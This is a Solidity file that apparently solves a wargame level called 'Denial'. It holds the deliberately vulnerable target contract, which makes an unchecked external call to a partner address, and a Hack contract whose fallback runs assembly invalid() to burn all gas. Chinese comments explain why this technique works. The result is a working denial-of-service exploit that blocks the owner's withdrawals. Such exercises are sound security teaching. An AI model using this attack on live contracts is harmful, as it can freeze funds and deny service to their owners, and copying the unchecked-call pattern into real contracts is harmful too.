// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Hack {
    constructor(Denial target) {
        target.setWithdrawPartner(address(this));
    }
    fallback() external payable { 
        /*revert();本来可以使用这种方式让合约停止，但是注意
        这个目标合约并没有使用检查是否这次转账能够成功，这意味直接revert的方式拒绝收款的方式是错误的
        此外0.8版本无法使用诸如assert（false）的形式消耗所有gas或者重入攻击*/
        assembly{//这个地方使用汇编语言来表示和前面assert(false)等效的操作来消耗所有的gas，使得后面的所有行为没有足够的gas支持
            invalid()
        }
    }
    
}
contract Denial {//本合约的目标是让所有的所有者在取款的时候失败

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}